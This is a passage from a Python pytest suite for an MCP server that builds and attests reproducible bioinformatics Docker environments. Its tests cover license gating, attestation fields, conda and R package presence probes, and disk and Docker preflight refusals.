    ta_req = TypeAdapter(StrList)
    # OptStrList — used by `licenses`
    assert ta_opt.validate_python(["MIT"]) == ["MIT"]
    assert ta_opt.validate_python('["MIT", "Apache-2.0"]') == ["MIT", "Apache-2.0"]
    assert ta_opt.validate_python(None) is None
    # StrList — used by `tools`
    assert ta_req.validate_python(["samtools=1.21"]) == ["samtools=1.21"]
    assert ta_req.validate_python('["samtools=1.21", "bwa=0.7.17"]') == [
        "samtools=1.21", "bwa=0.7.17",
    ]


def test_mcp_freeze_schema_still_advertises_licenses_array_or_null():
    """F0 must not change the EXPORTED schema shape (D4 carries forward):
    `licenses` stays an Optional[array] in the JSON schema agents introspect."""
    import asyncio
    from agent.mcp_server import mcp
    tool = asyncio.run(mcp.get_tool("freeze"))
    prop = tool.parameters["properties"]["licenses"]
    types = {sub.get("type") for sub in prop.get("anyOf", [])}
    assert "array" in types and "null" in types


def test_freeze_merges_draft_licenses_when_caller_omits_them(monkeypatch, tmp_path):
    """F1 — an agent that diligently `patch_pipeline({licenses, license_gated})`
    on the draft must not be punished for forgetting to re-pass licenses on
    freeze(). The merge takes the draft's licenses when the caller's are empty.

    We stub the post-merge steps (cache lookup, build) so this test focuses
    purely on the merge — the early-gate is what we'd hit without the merge.
    """
    import agent.mcp_server as ms

    captured = {}

    def fake_get_draft(pid):
        return {
            "licenses": ["proprietary-EULA"],
            "license_gated": True,
            "redistributable": False,
        }

    def fake_request_key(*args, **kwargs):
        captured["licenses_at_rkey"] = list(kwargs.get("licenses") or [])
        captured["gated_at_rkey"] = bool(kwargs.get("gated"))
        # short-circuit by raising — we only want to observe the merge
        raise RuntimeError("short_circuit")

    monkeypatch.setattr(ms._pipeline_state, "get_draft", fake_get_draft)
    monkeypatch.setattr(ms._freeze, "request_key", fake_request_key)

    # Caller does NOT pass licenses; draft has them. Pre-fix this would have
    # hit the I13 early-gate (gated=False from caller → but draft promotes →
    # licenses=[] from caller → refusal). With F1 the draft licenses merge in.
    try:
        ms.freeze(env_name="test", tools=["secret_tool=1.0"],
                  pipeline_id="some_pipeline_id", gated=False, licenses=None)
    except RuntimeError as e:
        assert str(e) == "short_circuit"
    assert captured["licenses_at_rkey"] == ["proprietary-EULA"], (
        "freeze() must merge draft.licenses when caller passes licenses=None")
    assert captured["gated_at_rkey"] is True, (
        "freeze() must promote to gated when draft.license_gated=true")


def test_freeze_caller_licenses_win_over_draft(monkeypatch, tmp_path):
    """F1 — caller intent wins. A caller that explicitly passes
    licenses=['MIT'] is NOT overridden by a different licenses[] on the draft.
    (The merge is fallback-when-empty, not always-overlay.)"""
    import agent.mcp_server as ms

    captured = {}

    def fake_get_draft(pid):
        return {"licenses": ["proprietary-EULA"], "license_gated": True}

    def fake_request_key(*args, **kwargs):
        captured["licenses_at_rkey"] = list(kwargs.get("licenses") or [])
        raise RuntimeError("short_circuit")

    monkeypatch.setattr(ms._pipeline_state, "get_draft", fake_get_draft)
    monkeypatch.setattr(ms._freeze, "request_key", fake_request_key)

    try:
        ms.freeze(env_name="test", tools=["t=1"], pipeline_id="pid",
                  gated=True, licenses=["MIT"])
    except RuntimeError:
        pass
    assert captured["licenses_at_rkey"] == ["MIT"], (
        "caller's explicit licenses[] must NOT be overlaid by draft.licenses")


def test_freeze_i13_early_gate_refuses_before_docker_work(monkeypatch):
    """F2 — a gated build with empty licenses[] must refuse IMMEDIATELY,
    before request_key/cache-lookup/docker build. Pre-fix the same refusal
    happened only AFTER the docker build finished (env_honesty.check_build),
    so the user paid 10-30 min of build time for a known-doomed call.

    We assert by monkeypatching every downstream surface that should NEVER
    be hit and confirming none of them are touched.
    """
    import agent.mcp_server as ms

    called = {"rkey": False, "lookup": False, "build": False}

    def boom_rkey(*a, **kw):
        called["rkey"] = True
        raise AssertionError("request_key called — early gate did not fire")

    def boom_lookup(*a, **kw):
        called["lookup"] = True
        raise AssertionError("cache lookup called — early gate did not fire")

    def boom_build(*a, **kw):
        called["build"] = True
        raise AssertionError("build_env_image called — early gate did not fire")

    monkeypatch.setattr(ms._freeze, "request_key", boom_rkey)
    monkeypatch.setattr(ms._env_cache, "lookup_anchored", boom_lookup)
    monkeypatch.setattr(ms._env_freeze, "build_env_image", boom_build)
    # No draft to interfere
    monkeypatch.setattr(ms._pipeline_state, "get_draft", lambda pid: None)

    result = ms.freeze(env_name="test", tools=["secret_tool=1.0"],
                      gated=True, licenses=None)
    assert result["success"] is False
    assert result["stage"] == "i13_early_gate"
    inv_ids = {v["invariant"] for v in result["honesty_violations"]}
    assert "I13.gated_license_recorded" in inv_ids
    assert not any(called.values()), "early-gate must short-circuit ALL downstream calls"


def test_freeze_i13_early_gate_uses_same_invariant_id_as_envhonesty():
    """F2 (consistency) — the early-gate's violation MUST be structurally
    identical to the contract's (`I13.gated_license_recorded`). A downstream
    handler that buckets honesty_violations by invariant id should treat the
    two refusal paths as the same failure mode."""
    import agent.mcp_server as ms
    result = ms.freeze(env_name="t", tools=["x=1"], gated=True, licenses=None)
    inv = result["honesty_violations"][0]
    assert inv["invariant"] == "I13.gated_license_recorded"
    assert inv["where"] == "licenses"


def test_attestation_predicate_carries_licenses_and_accelerator():
    """F4 — the SLSA attestation must propagate the declared licenses[] AND
    the accelerator policy that POLICY_CLEAN was evaluated against. Without
    these, the attestation says 'POLICY_CLEAN' without saying 'against what',
    breaking downstream cosign-verify of a gated artifact."""
    from agent.skills.attestation import build_attestation
    record = {
        "image": "ours:1.0", "image_digest": "sha256:" + "a" * 64,
        "mode": "build",
        "verifications": [{"tool": "t", "label": "t", "check": "command -v t",
                           "passed": True, "rc": 0}],
        "gated": True, "redistributable": False,
        "licenses": ["proprietary-EULA", "noncommercial-use-only"],
        "accelerator": {"type": "cuda", "toolkit_version": "12.4",
                        "runtime": "build_only"},
    }
    att = build_attestation(record)
    ip = att["predicate"]["buildDefinition"]["internalParameters"]
    assert ip["licenses"] == ["proprietary-EULA", "noncommercial-use-only"]
    assert ip["license_gated"] is True
    assert ip["accelerator"] == {"type": "cuda", "toolkit_version": "12.4",
                                 "runtime": "build_only"}


def test_attestation_predicate_licenses_empty_when_unrestricted():
    """F4 (defense-in-depth) — an ungated build still carries the licenses[]
    key (empty list), so a verifier can rely on the field's presence rather
    than guessing whether absence means 'no licenses' or 'no policy'."""
    from agent.skills.attestation import build_attestation
    record = {"image": "ours:1.0", "image_digest": "sha256:" + "b" * 64,
              "mode": "build"}
    att = build_attestation(record)
    ip = att["predicate"]["buildDefinition"]["internalParameters"]
    assert ip["licenses"] == []
    assert ip["license_gated"] is False
    assert ip["accelerator"] == {}


def test_attestation_predicate_licenses_present_on_adopt_path():
    """F4 — adopt mode carries policy too (the dorado-stress lesson: we
    declare gated/licenses ON ourselves regardless of who built the bytes)."""
    from agent.skills.attestation import build_attestation
    # `redistributable: False` is REQUIRED, not decoration: I13 says a gated artifact must
    # be marked non-redistributable, and `freeze_record` derives exactly that from `gated`.
    # The fixture omitted it and passed anyway, because the contract read only the modern
    # `license_gated` key and this record carries the legacy `gated` — so I13 was skipped
    # entirely on the one record shape written to assert I13 is carried. Reading gatedness
    # through `core_data.record_is_gated` woke the clause up, and it immediately objected.
    record = {"image": "biocon:1.0", "image_digest": "sha256:" + "c" * 64,
              "mode": "adopt", "gated": True, "licenses": ["EULA-X"],
              "redistributable": False}
    att = build_attestation(record)
    ip = att["predicate"]["buildDefinition"]["internalParameters"]
    assert ip["licenses"] == ["EULA-X"]
    assert ip["license_gated"] is True
    # mode-aware honesty preserved (the adopt contract)
    assert ip["honesty_contract"] == [
        "ADOPTED_BY_DIGEST", "POLICY_CLEAN.accelerator", "POLICY_CLEAN.accelerator_observed",
        "POLICY_CLEAN.license",
        "PROVENANCE_CLEAN"]

    # ...and the legacy key really does gate now: drop the marking and I13 fires, so the
    # clause is reported as failed instead of silently guaranteed.
    del record["redistributable"]
    ip2 = build_attestation(record)["predicate"]["buildDefinition"]["internalParameters"]
    assert "POLICY_CLEAN.license" not in ip2["honesty_contract"]
    assert "POLICY_CLEAN.license" in ip2["contract_coverage"]["failed"]


# =============================================================================
# Batch-2 stress-test fixes (2026-05-27) — R-package handling (R5 + R6)
#
# A draft with a failed-then-retried `bioconductor-deseq2` install + a stale
# `bioconductor-deseq2=1.30` install_step exposed two breaks in the R-conda
# path: the verify command was the python-dist probe (DESeq2 isn't a python
# dist), and the failed-version spec got asked of the engine alongside the
# retried one. Both surface as "the build fails IN the shipped image with a
# diagnostic that doesn't point at the real cause".
# =============================================================================


def test_conda_presence_check_routes_bioconductor_to_rscript():
    """R5 — `bioconductor-*` packages are R libraries, not python dists. The
    verify command must invoke R's installed.packages(), not python's
    importlib.metadata (which would silently fail with a 'no metadata' error
    for every Bioconductor install, masquerading as a build failure)."""
    from agent.skills.env_freeze import _conda_presence_check
    chk = _conda_presence_check("bioconductor-deseq2")
    assert chk.startswith("Rscript")
    assert "installed.packages" in chk
    # the conda-name's suffix is the lookup name (post evidence-shape's
    # prefix-strip the tool token is `deseq2`)
    assert "deseq2" in chk.lower()
    # case-insensitive lookup (DESeq2 vs deseq2)
    assert "ignore.case=TRUE" in chk


def test_conda_presence_check_routes_rprefix_to_rscript():
    """R5 — same routing for `r-*` packages (the CRAN-installed-via-conda tier,
    e.g. r-tidyverse, r-ape, r-snpstats). Same library-not-CLI shape."""
    from agent.skills.env_freeze import _conda_presence_check
    chk = _conda_presence_check("r-tidyverse")
    assert chk.startswith("Rscript")
    assert "tidyverse" in chk.lower()


def test_conda_presence_check_passes_evidence_shape_for_r_packages():
    """R5 — env_honesty's word-boundary token rule already strips the
    `bioconductor-` / `r-` prefix when checking tool token presence. Our
    Rscript verify command references the SUFFIX (`deseq2`), so the
    evidence_shape gate accepts it. Pre-fix the verify referenced the FULL
    conda name in `command -v bioconductor-deseq2` — also passed the shape
    rule, but the command never returned 0 in the image."""
    from agent.skills.env_freeze import _conda_presence_check
    from agent.skills.env_honesty import evidence_shape_violation
    chk = _conda_presence_check("bioconductor-deseq2")
    # the contract's evidence_shape strips the conda prefix internally; both
    # `bioconductor-deseq2` and `deseq2` reference must satisfy the rule
    assert evidence_shape_violation(chk, "bioconductor-deseq2") is None


def test_conda_presence_check_unchanged_for_non_R_packages():
    """R5 — the R routing is a strict ADD on top of the generic conda chain:
    ordinary conda CLI/python packages still start with `command -v X` (the
    fast path) and still include the python dist-metadata fallback for the
    library-only case (numpy, scipy)."""
    from agent.skills.env_freeze import _conda_presence_check
    chk = _conda_presence_check("samtools")
    assert chk.startswith("command -v samtools")
    chk_py = _conda_presence_check("numpy")
    assert chk_py.startswith("command -v numpy")
    assert "importlib.metadata" in chk_py


# =============================================================================
# Batch-3 Apollo3 followup (2026-05-27) — C4: N1, conda binary-name discovery
#
# Pre-fix the conda presence chain was `command -v {pkg} || python ...
# importlib.metadata.distribution({pkg})`. Both clauses assume the binary
# (clause 1) or the python dist (clause 2) is named after the package — but
# many conda packages don't follow that: mongodb→mongod, nodejs→node,
# openjdk→java, mysql→mysqld, postgresql→postgres, python→python3.
# Apollo3 freeze failed VALIDATED_IN_IMAGE on the conda nodejs+mongodb
# install with both clauses returning rc=127 even though the packages were
# healthily installed. C4 inserts a middle clause that reads the package's
# conda-meta `files:` list (which IS recorded under the package name) to
# find the real bin/* entries and tests one is on PATH.
# =============================================================================


def test_conda_presence_check_inserts_conda_meta_bin_probe():
    """N1 — the new clause sits BETWEEN `command -v` and the python fallback.
    On `mongodb` (pkg name) the probe must reference the conda-meta path so
    a healthy install where the binary is `mongod` (NOT `mongodb`) still
    passes."""
    from agent.skills.env_freeze import _conda_presence_check
    chk = _conda_presence_check("mongodb")
    # clause 1: command -v
    assert chk.startswith("command -v mongodb || ")
    # clause 2 (NEW): the conda-meta sh -c probe — must reference the
    # conda-meta path AND the package name
    assert "conda-meta/mongodb-" in chk
    # the probe extracts "bin/X" entries from the conda-meta JSON
    assert 'sed -nE' in chk and '"bin/' in chk
    # and tests each basename via `command -v`
    assert 'command -v "$b"' in chk
    # clause 3: python importlib fallback still present
    assert "importlib.metadata" in chk


def test_conda_pkg_bin_check_sh_is_shell_only_no_python_dep():
    """N1 — the conda-meta probe must NOT depend on python being in the env
    (the bug is real for envs that DON'T have python: nodejs/mongodb-only).
    Verify the shell expression uses pure shell tooling (sed, command, no
    `python -c`)."""
    from agent.skills.env_freeze import _conda_pkg_bin_check_sh
    expr = _conda_pkg_bin_check_sh("nodejs")
    # No python invocation in clause 2 — that's clause 3's job
    assert "python " not in expr and "python\n" not in expr
    # Subshell shape: the body composes via `||` without `exit` bleeding to
    # the parent. (Pre-fix this was `sh -c '...'`; that broke when re-parsed
    # inside an outer `bash -c "..."` because the inner sed expression's
    # single quote closed the outer single-quote mid-body. The subshell
    # `(...)` form has no nested quoting and is re-parse-safe — see
    # tests/integration/test_n1_conda_meta_probe_docker.py for the live
    # docker round-trip.)
    assert expr.startswith("( ") and expr.endswith(" )")
    assert "sed -nE" in expr
    assert "command -v" in expr


def test_conda_pkg_bin_check_sh_references_both_layout_paths():
    """N1 — the probe must look under BOTH `/opt/conda/envs/*/conda-meta/`
    (pixi-managed envs, the typical layout) AND `/opt/conda/conda-meta/`
    (base-env installs, legacy layout). A probe that misses one layout
    would silently fail on a clean image and look like the original bug."""
    from agent.skills.env_freeze import _conda_pkg_bin_check_sh
    expr = _conda_pkg_bin_check_sh("nodejs")
    assert "/opt/conda/envs/*/conda-meta/nodejs-" in expr
    assert "/opt/conda/conda-meta/nodejs-" in expr


def test_conda_presence_check_evidence_shape_passes_for_binary_mismatch():
    """N1 — the new chain references {pkg} as a word-boundary token (in the
    conda-meta glob `{pkg}-*.json`), so env_honesty.evidence_shape's
    anchor rule accepts it. Critical: a probe that passed shape but didn't
    reference the package would let a non-anchored cheat through. The
    `{pkg}-*.json` filename glob IS the anchor."""
    from agent.skills.env_freeze import _conda_presence_check
    from agent.skills.env_honesty import evidence_shape_violation
    chk = _conda_presence_check("mongodb")
    assert evidence_shape_violation(chk, "mongodb") is None
    chk2 = _conda_presence_check("nodejs")
    assert evidence_shape_violation(chk2, "nodejs") is None
    chk3 = _conda_presence_check("openjdk")
    assert evidence_shape_violation(chk3, "openjdk") is None


def test_conda_presence_check_clause_order_short_circuits_on_command_v_first():
    """N1 — the fast path `command -v {pkg}` runs FIRST so trivial cases
    (samtools, bwa, fastqc — pkg name == bin name) short-circuit without
    needing to read any conda-meta file. The cost of the conda-meta probe
    is only paid when the binary isn't named after the package."""
    from agent.skills.env_freeze import _conda_presence_check
    chk = _conda_presence_check("samtools")
    cmd_v_idx = chk.find("command -v samtools")
    cm_idx = chk.find("conda-meta/")
    py_idx = chk.find("importlib.metadata")
    # the order is command -v → conda-meta → python
    assert 0 == cmd_v_idx < cm_idx < py_idx


def test_r_presence_check_strips_known_prefixes():
    """R5 (defense-in-depth) — the prefix-strip is the bioconductor- / r-
    SET, not a regex; a name without one of those prefixes passes through
    as-is. So `lme4` (already library-shaped, hypothetical) yields a check
    that references `lme4`."""
    from agent.skills.env_freeze import _r_presence_check
    # explicit-prefix cases
    assert "deseq2" in _r_presence_check("bioconductor-deseq2").lower()
    assert "tidyverse" in _r_presence_check("r-tidyverse").lower()
    # no-prefix passthrough — only matters when _r_presence_check is called
    # directly (the dispatcher only routes prefixed names there)
    assert "snpstats" in _r_presence_check("snpStats").lower()


def test_requested_conda_specs_filters_failed_installs():
    """R6 — a conda install_step with rc != 0 must NOT contribute its
    installed_packages claim to the engine's request. The failed install's
    package record is unsafe (the install didn't actually complete) — feeding
    it back to the engine as a spec asks the engine to re-attempt a known-bad
    install, often with a name that doesn't exist on the channel."""
    from agent.skills.freeze import requested_conda_specs
    draft = {"install_steps": [
        # a failed install — must be filtered
        {"tool": "conda", "subcommand": "install", "returncode": 1,
         "installed_packages": [{"name": "ghost", "version": "0.0.0"}]},
        # a successful install — must surface
        {"tool": "conda", "subcommand": "install", "returncode": 0,
         "installed_packages": [{"name": "samtools", "version": "1.21"}]},
    ]}
    specs = requested_conda_specs(draft)
    assert specs == ["samtools=1.21"]


def test_requested_conda_specs_move_to_end_dedup_on_retry():
    """R6 — a retried install (failed → fixed dep → succeeded with a new
    version) must produce ONE spec, the SUCCESSFUL retry's version, AFTER
    any intervening successful installs in the replay order. Pre-fix both
    versions surfaced, so the engine would be asked to install BOTH (name
    conflict, or the engine picks the failed one). Mirrors
    installed_packages's move-to-end semantics."""
    from agent.skills.freeze import requested_conda_specs
    draft = {"install_steps": [
        # the first attempt — failed (filtered by rc check)
        {"tool": "conda", "subcommand": "install", "returncode": 1,
         "installed_packages": [{"name": "deseq2-deps", "version": "1.0"}]},
        # the dep-fix install (a different package)
        {"tool": "conda", "subcommand": "install", "returncode": 0,
         "installed_packages": [{"name": "rlang", "version": "1.1"}]},
        # the retried deseq2-deps install — different version, succeeded
        {"tool": "conda", "subcommand": "install", "returncode": 0,
         "installed_packages": [{"name": "deseq2-deps", "version": "1.2"}]},
    ]}
    specs = requested_conda_specs(draft)
    # exactly one entry per name (move-to-end dedup)
    assert specs == ["rlang=1.1", "deseq2-deps=1.2"]
    # the retry sits AFTER rlang — the order matters for replay (retry deps
    # must have landed first)
    assert specs.index("rlang=1.1") < specs.index("deseq2-deps=1.2")


def test_requested_conda_specs_rc_none_treated_as_passthrough():
    """R6 — an install_step with no returncode field (older drafts, or
    create-time records) passes through. The conditional only iterates
    `tool=conda subcommand=install`, so create steps (no rc, no installed_
    packages of interest) are no-ops; install steps without rc shouldn't be
    treated as failed just because rc isn't recorded yet."""
    from agent.skills.freeze import requested_conda_specs
    draft = {"install_steps": [
        # no returncode field at all — treated as success-by-default
        {"tool": "conda", "subcommand": "install",
         "installed_packages": [{"name": "samtools", "version": "1.21"}]},
    ]}
    specs = requested_conda_specs(draft)
    assert specs == ["samtools=1.21"]


# =============================================================================
# Batch-2 stress-test fixes (2026-05-27) — MD report parity for adopt mode (R1)
#
# The .md env report rendered adopt-mode rows with Version='—', Install='—',
# Validated='—' because the recorded resolved_packages/verifications were
# empty (correctly — adopt doesn't capture an in-locus closure). The version
# was sitting on the request_key and the HTML report already used it; the
# .md renderer just hadn't been updated. R1 = MD/HTML parity.
# =============================================================================


def test_requested_versions_helper_parses_request_key():
    """R1 (unit) — the shared helper parses the request_key's spec segment
    correctly, including unversioned (bare-name) tools."""
    from agent.skills.env_report_helpers import requested_versions
    rv = requested_versions({"request_key": "samtools=1.21,bwa=0.7.17|linux/amd64|none"})
    assert rv == {"samtools": "1.21", "bwa": "0.7.17"}
    # unversioned tools get empty string (not missing)
    rv2 = requested_versions({"request_key": "fastqc|linux/amd64|none"})
    assert rv2 == {"fastqc": ""}


def test_requested_versions_helper_falls_back_to_conda_specs():
    """R1 (unit) — older records without request_key fall back to conda_specs."""
    from agent.skills.env_report_helpers import requested_versions
    rv = requested_versions({"conda_specs": ["samtools=1.21"]})
    assert rv == {"samtools": "1.21"}
    # request_key wins over conda_specs when both present (request_key is
    # the canonical "what was asked"; conda_specs may include solver fillins)
    rv = requested_versions({
        "request_key": "samtools=1.21|linux/amd64|none",
        "conda_specs": ["samtools=999"],
    })
    assert rv["samtools"] == "1.21"


def test_check_disk_failsafe_returns_none_when_disk_is_healthy(monkeypatch):
    """A1 — a healthy disk passes through (returns None, meaning 'go ahead')."""
    import agent.mcp_server as ms
    import shutil
    # 500 GB free, way above any sane threshold
    fake = type("Usage", (), {"free": 500 * (1024 ** 3)})()
    monkeypatch.setattr(shutil, "disk_usage", lambda p: fake)
    assert ms._check_disk_failsafe(min_gb=10) is None


def test_check_disk_failsafe_refuses_with_diagnostic_when_disk_is_low(monkeypatch):
    """A1 — a stressed disk produces a refusal dict naming the cleanup
    commands. The whole point is to fail FAST with a diagnostic the agent
    can act on — not to wedge waiting for the docker build to discover
    the same fact 20 min later."""
    import agent.mcp_server as ms
    import shutil
    # 3 GB free, well below the 10 GB default threshold
    fake = type("Usage", (), {"free": 3 * (1024 ** 3)})()
    monkeypatch.setattr(shutil, "disk_usage", lambda p: fake)
    result = ms._check_disk_failsafe(min_gb=10)
    assert result is not None
    assert result["success"] is False
    assert result["stage"] == "disk_failsafe"
    assert result["free_gb"] == 3.0
    assert result["min_gb"] == 10
    # the diagnostic names the cleanup commands
    assert "docker builder prune" in result["message"]
    assert "docker system prune" in result["message"]


def test_check_disk_failsafe_honors_env_override(monkeypatch):
    """A1 — BIOINF_FREEZE_MIN_DISK_GB env var overrides the default. Setting
    it to 0 fully disables the check (escape hatch for CI mocks and tests
    that explicitly bypass)."""
    import agent.mcp_server as ms
    import shutil
    fake = type("Usage", (), {"free": 1 * (1024 ** 3)})()   # 1 GB — would normally refuse
    monkeypatch.setattr(shutil, "disk_usage", lambda p: fake)
    # 0 disables
    monkeypatch.setenv("BIOINF_FREEZE_MIN_DISK_GB", "0")
    assert ms._check_disk_failsafe() is None
    # higher threshold trips at 1 GB
    monkeypatch.setenv("BIOINF_FREEZE_MIN_DISK_GB", "5")
    assert ms._check_disk_failsafe() is not None


# --- Docker preflight (P1 — front door / honest floor) ---------------------
# One upfront guard so a missing/stopped daemon surfaces as ONE correctly-named
# refusal, instead of a raw FileNotFoundError from one path and a mislabeled
# 'image_pull_failed' from another. Probes the SERVER (docker version), not the
# client, because `docker --version` succeeds even with the daemon down.

def _fake_completed(returncode, stdout="", stderr=""):
    return type("R", (), {"returncode": returncode, "stdout": stdout, "stderr": stderr})()


def test_check_docker_available_none_when_daemon_healthy(monkeypatch):
    import agent.mcp_server as ms
    import subprocess
    monkeypatch.delenv("BIOINF_SKIP_DOCKER_PREFLIGHT", raising=False)
    monkeypatch.setattr(subprocess, "run", lambda *a, **k: _fake_completed(0, "27.0.3"))
    assert ms._check_docker_available() is None


def test_check_docker_available_refuses_when_binary_missing(monkeypatch):
    """No `docker` on PATH → a correctly-named refusal, not a raw FileNotFoundError
    bubbling out of a build."""
    import agent.mcp_server as ms
    import subprocess
    monkeypatch.delenv("BIOINF_SKIP_DOCKER_PREFLIGHT", raising=False)

    def _raise(*a, **k):
        raise FileNotFoundError("docker")
    monkeypatch.setattr(subprocess, "run", _raise)
    r = ms._check_docker_available()
    assert r is not None and r["success"] is False
    assert r["stage"] == "docker_preflight"
    assert r["code"] == "docker.not_installed"


def test_check_docker_available_refuses_when_daemon_down(monkeypatch):
    """CLI present but daemon unreachable (rc!=0) → a daemon_unavailable refusal that
    carries the daemon's own diagnostic, not a mislabeled 'image pull failed'."""
    import agent.mcp_server as ms
    import subprocess
    monkeypatch.delenv("BIOINF_SKIP_DOCKER_PREFLIGHT", raising=False)
    monkeypatch.setattr(subprocess, "run", lambda *a, **k: _fake_completed(
        1, "", "Cannot connect to the Docker daemon at unix:///var/run/docker.sock."))
    r = ms._check_docker_available()
    assert r is not None and r["code"] == "docker.daemon_unavailable"
    assert "Cannot connect to the Docker daemon" in r["message"]


def test_check_docker_available_refuses_on_timeout(monkeypatch):
    import agent.mcp_server as ms
    import subprocess
    monkeypatch.delenv("BIOINF_SKIP_DOCKER_PREFLIGHT", raising=False)

    def _timeout(*a, **k):
        raise subprocess.TimeoutExpired(cmd="docker version", timeout=20)
    monkeypatch.setattr(subprocess, "run", _timeout)
    r = ms._check_docker_available()
    assert r is not None and r["code"] == "docker.daemon_unavailable"


def test_check_docker_available_honors_skip_env(monkeypatch):
    """BIOINF_SKIP_DOCKER_PREFLIGHT=1 bypasses the probe entirely (a dev/ops escape
    hatch mirroring BIOINF_FREEZE_MIN_DISK_GB=0). subprocess is NOT called."""
    import agent.mcp_server as ms
    import subprocess

    def _boom(*a, **k):
        raise AssertionError("subprocess.run must not run when the skip env is set")
    monkeypatch.setattr(subprocess, "run", _boom)
    monkeypatch.setenv("BIOINF_SKIP_DOCKER_PREFLIGHT", "1")
    assert ms._check_docker_available() is None


def test_freeze_refuses_early_when_docker_unavailable(monkeypatch):
    """The freeze() entrypoint returns the docker preflight refusal BEFORE any
    cache/parse/build work — the single upfront guard for a docker-down machine."""
    from agent.mcp_tools import freeze_tools
    from agent import mcp_server as _ms
    monkeypatch.setattr(_ms, "_check_disk_failsafe", lambda: None)
    monkeypatch.setattr(_ms, "_check_docker_available",
                        lambda: {"success": False, "outcome": "refused",
                                 "stage": "docker_preflight",
                                 "code": "docker.daemon_unavailable",
                                 "message": "docker down"})
    out = freeze_tools.freeze(env_name="bioinf_docker_down_zzz", tools=["samtools=1.21"])
    assert out.get("stage") == "docker_preflight", out
    assert out.get("code") == "docker.daemon_unavailable", out


def test_check_disk_failsafe_safe_on_disk_usage_failure(monkeypatch):
    """A1 (defense-in-depth) — if shutil.disk_usage itself raises (exotic
    FS, sandboxed env), the failsafe must NOT refuse. A failsafe that
    blocks legitimate work because IT couldn't read disk is worse than no
    failsafe."""
    import agent.mcp_server as ms
    import shutil
    def boom(_):
        raise OSError("can't read disk")
    monkeypatch.setattr(shutil, "disk_usage", boom)
    assert ms._check_disk_failsafe(min_gb=10) is None


def test_freeze_refuses_at_entry_when_disk_failsafe_fires(monkeypatch):
    """A1 end-to-end — freeze() returns the disk-failsafe refusal IMMEDIATELY,
    before any cache lookup, biocontainer resolve, or docker work. Same shape
    as the I13 early-gate refusal."""
    import agent.mcp_server as ms

    def fake_check(min_gb=None):
        return {"success": False, "stage": "disk_failsafe",
                "free_gb": 2.0, "min_gb": 10, "message": "no space"}

    # boom every downstream surface — none should be reached
    def boom(*a, **kw):
        raise AssertionError("disk failsafe did not refuse fast enough")
    monkeypatch.setattr(ms, "_check_disk_failsafe", fake_check)
    monkeypatch.setattr(ms._freeze, "request_key", boom)
    monkeypatch.setattr(ms._env_cache, "lookup_anchored", boom)

    result = ms.freeze(env_name="t", tools=["samtools=1.21"])
    assert result["stage"] == "disk_failsafe"
    assert result["free_gb"] == 2.0


def test_prune_buildkit_after_failure_reports_outcome(monkeypatch):
    """A2 — the prune helper returns a structured outcome dict (attempted/ok/
    reclaimed) the freeze() result can fold in. Never raises."""
    import agent.mcp_server as ms
    import subprocess

    class FakeResult:
        returncode = 0
        stdout = "deleted: sha256:abc\nTotal reclaimed space: 14.2GB\n"
        stderr = ""

    monkeypatch.setattr(subprocess, "run", lambda *a, **kw: FakeResult())
    r = ms._prune_buildkit_after_failure()
    assert r["attempted"] is True
    assert r["ok"] is True
    assert "14.2GB" in r["reclaimed"]


def test_prune_buildkit_swallows_exceptions(monkeypatch):
    """A2 — a docker-not-running / timeout / sandbox-blocked prune must not
    raise. We report the failure and let the caller decide; never compound
    a build failure with a cleanup failure."""
    import agent.mcp_server as ms
    import subprocess
    def boom(*a, **kw):
        raise subprocess.TimeoutExpired("docker", 120)
    monkeypatch.setattr(subprocess, "run", boom)
    r = ms._prune_buildkit_after_failure()
    assert r["attempted"] is True
    assert r["ok"] is False
    assert "TimeoutExpired" in r["reason"]


def test_freeze_invokes_post_failure_prune_only_when_disk_stressed(monkeypatch, tmp_path):
    """A2 — the post-failure prune runs ONLY when free disk is below the
    SOFT threshold (1.5x the hard one). On a healthy disk we keep buildkit
    cache for fast iteration on the next retry."""
    import agent.mcp_server as ms

    # Force the freeze flow into the build branch with a deterministic failure
    monkeypatch.setattr(ms, "_check_disk_failsafe", lambda min_gb=None: None)
    monkeypatch.setattr(ms._pipeline_state, "get_draft", lambda pid: None)
    monkeypatch.setattr(ms._freeze, "request_key", lambda *a, **kw: "rk")
    monkeypatch.setattr(ms._env_cache, "lookup_anchored", lambda rk, present: None)
    monkeypatch.setattr(ms._freeze, "compute_content_digest", lambda d: "cd")
    monkeypatch.setattr(ms._biocontainers, "resolve_biocontainer",
                        lambda parsed: {"found": False})
    monkeypatch.setattr(ms._freeze, "non_conda_installs", lambda d: [])
    monkeypatch.setattr(ms._freeze, "env_mutating_pipeline_steps", lambda d: [])
    monkeypatch.setattr(ms._freeze, "requested_conda_specs", lambda d: ["x=1"])
    monkeypatch.setattr(ms._env_freeze, "build_env_image",
                        lambda *a, **kw: {"success": False, "stage": "install",
                                          "reason": "ENOSPC during conda solve"})
    prune_called = {"count": 0}
    monkeypatch.setattr(ms, "_prune_buildkit_after_failure",
                        lambda: (prune_called.__setitem__("count", prune_called["count"] + 1)
                                 or {"attempted": True, "ok": True, "reclaimed": "1GB"}))

    # CASE 1: healthy disk — prune NOT invoked
    import shutil
    monkeypatch.setattr(shutil, "disk_usage",
                        lambda p: type("U", (), {"free": 200 * (1024 ** 3)})())
    result = ms.freeze(env_name="t", tools=["x=1"])
    assert result["stage"] == "container_build"
    assert prune_called["count"] == 0, "healthy-disk failure must NOT prune"
    assert "buildkit_prune" not in result

    # CASE 2: stressed disk — prune IS invoked
    monkeypatch.setattr(shutil, "disk_usage",
                        lambda p: type("U", (), {"free": 5 * (1024 ** 3)})())
    result = ms.freeze(env_name="t", tools=["x=1"])
    assert prune_called["count"] == 1
    assert "buildkit_prune" in result
    assert result["buildkit_prune"]["ok"] is True


# =============================================================================
# Batch-3 Apollo3 followups (2026-05-27) — C1: relocate workspace state
#
# Pre-fix: env_reports/ was a mix of SHIPPABLE deliverables (ENV.html, attestation
# .json, recipe.yaml, _env_cache.json) AND workspace state (pipeline drafts, W1
# background freeze args + result JSON). An operator listing env_reports/ could
# not tell at a glance which envs had shipped from which were half-finished. C1
# splits: drafts → data/pipeline_drafts/, W1 ephemera → data/jobs/ (keyed by
# job_id, sibling of the existing JobManager log/status files for the SAME
# job). env_reports/ becomes deliverables-only.
# =============================================================================


def test_pipeline_drafts_land_in_drafts_dir_not_env_reports(tmp_path):
    """C1 — a new draft writes to drafts_dir, NOT pipelines_dir/. Listing
    pipelines_dir (env_reports/ in prod) should show ONLY frozen envs'
    deliverables; an in-progress draft must not pollute that view."""
    from agent.skills.pipeline_state import PipelineState
    drafts = tmp_path / "drafts"
    reports = tmp_path / "reports"
    cfg = {"paths": {
